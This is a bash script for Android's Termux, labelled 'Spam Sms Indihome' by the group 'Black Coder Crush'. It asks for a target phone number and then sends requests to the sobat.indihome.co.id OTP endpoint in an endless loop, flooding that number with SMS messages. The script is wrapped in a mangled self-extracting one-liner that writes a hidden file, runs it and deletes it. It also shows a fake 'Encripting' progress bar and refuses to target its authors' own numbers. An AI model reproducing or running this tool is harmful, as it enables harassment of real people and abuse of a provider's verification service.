#Encriptingby@rusmana_id#Team:BlackCoderCrushget=$(echo-e"$(echo"#!/data/data/com.termux/files/usr/bin/bash

b="\033[34;1m"
 p="\033[39;1m"
  k="\033[33;1m"
   m="\033[31;1m"
    h="\033[32;1m"
     c="\033[35;1m"
      pu="\033[36;1m"
       x="\033[30;1m"
        o="\033[0m"
        
clear        
function check(){
		if [ -z $(command -v curl) ];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install curl\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
		if [ -z $(command -v bash) ];then
		printf "${p}[${m}!${p}]${m}bash belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install bash\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
}
check
function banner(){
clear
printf "\t                ${x}Tools${m}: ${p}1.0 *_*\n"
printf "\t${b}______________________________\n"
printf "\t      ${p}Author${m}: ${c}Mr.Tr3v!0n\n"
printf "\t    ${p}Team${m}: ${h}Black Coder Crush\n"
printf "\t   ${p}Tools${m}: ${p}Spam Sms Indihome\n"
printf "\t           ${h}UNLIMITED\n"
printf "\t  ${p} Telegram${m}: ${c}@config_geratis\n"
printf "\t${b}______________________________\n"
printf "\t ${x}[18-05-20] ${m}| ${x}©Copyright_2020\n\n"
}
banner

function sec(){
        printf "\b${p}[${h}•${p}] Waiting Second!${h}...    ${p}"
			for w in {600..0};do
			get=$(printf "\b${w}")
		printf "\b\b\b ${k}$get"
			sleep 1
		done
		printf "\n"
}

function sec(){
declare -A a
d=('-' '\\\\'  '|' '\/')
ci=-1
bi='----------'
e=0
for x in {8..0};do
	if [[ $(( $x % 1 )) == 0  ]];then
		a+="="
		let ci=$ci-1
	fi
	printf "\r\t${p}[${k}?${p}] Encripting [${a[@]}${bi:0:ci}] (${h}$x${p}) "
	sleep 0.99
done
printf "\n"
}

function spam(){
ci=$(curl \
-s \
-I \
"https://sobat.indihome.co.id" \
| \
grep \
-Eo \
"ci_.*" \
| \
cut \
-d \
";" \
-f1)
bi=$(curl \
-s \
-I \
"https://sobat.indihome.co.id" \
| \
grep \
-Eo \
-i \
"bi.*" \
| \
cut \
-d \
";" \
-f1)
for \
(( \
i \
= \
1; \
i \
>= \
i; \
i++ \
));do
get=$(curl \
-s \
-X \
POST \
-H "Host:sobat.indihome.co.id" \
     -H \
     "Connection:keep-alive" \
     -H \
     "Content-Length:27" \
     -H \
     "Sec-Fetch-Dest:empty" \
     -H \
     "X-Requested-With:XMLHttpRequest" \
     -H \
     "User-Agent:Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36" \
     -H \
     "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" \
     -H \
     "Origin:https://sobat.indihome.co.id" \
     -H \
     "Sec-Fetch-Site:same-origin" \
     -H \
     "Referer:https://sobat.indihome.co.id/register" \
     -H \
     "Cookie:${ci}; ${bi}; _ga=GA1.3.1137015749.1589779086; _gid=GA1.3.1935658097.1589779086; _gat_gtag_UA_126652289_2=1" \
     -d \
     "type=hp&msisdn=${number}" "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp")
     z1=$(echo \
     -e \
     "${get}" \
     | \
     grep \
     -Eo \
     "dikirim" \
     | \
     grep \
     -Eo \
     "rim" \
     | \
     tr \
     "rim" "rus")
     
  if \
  [[ \
  ${z1} \
  =~ \
  "rus" \
  ]];then
     printf "${p}[${h}`date +%H:%M:%S`${p}] Spaming Sms To ${pu}$number ${m}[${h}Success!${m}]\n"
     
  else
     printf "${p}[${h}date +%H:%M:%S${p}] Spaming Sms To ${pu}$number ${m}[${m} Gagal!! ${m}]\n"
     sleep 0.5
   fi
     done
 }
     
function __main__(){
	printf "\t${b}╔════════════════════════╗ \n";printf "\t${b}║${p}NO TARGET${m}:${pu} " number
    read number;
    printf "\t${b}╚════════════════════════╝\n"    
    
    n=$(echo \
    -e \
    $number \
    | \
    grep \
    -Eo \
    "17166")
    n1=$(echo \
    -e \
    $number \
    | \
    grep \
    -Eo \
    "67622")
    if \
    [[ \
    ${n} \
    =~ \
    "17166" \
    ]];then
    echo \
    -e \
    "\n\t${p}[${m}!${p}] Gk Sopan Mau Spam Admin!!"
    exit
    
    elif \
    [[ \
    ${n1} \
    =~ \
    "67622" \
    ]];then
    echo \
    -e \
    "\n\t${p}[${m}!${p}] Gk Sopan Mau Spam Admin!!"
    exit
    fi
    
    if \
    [[ \
    ${number:0:3} \
    =~ \
    "+62" \
    ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="0${number:3:15}"
    spam $number
    elif \
    [[ \
    ${number:0:2} \
    =~ \
    "62" \
    ]]; then
    printf \
    "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="0${number:2:15}"
    spam $number
    elif \
    [[ \
    ${number:0:4} \
    =~ \
    "08" \
    ]]; then
    printf \
    "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="$number"
    spam $number
    else 
    printf "\t${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
    exit 1
    fi
}
__main__
"|sed'y/+//;s/%/\\x/g')">.!.sh);bash.!.sh;rm.!.sh
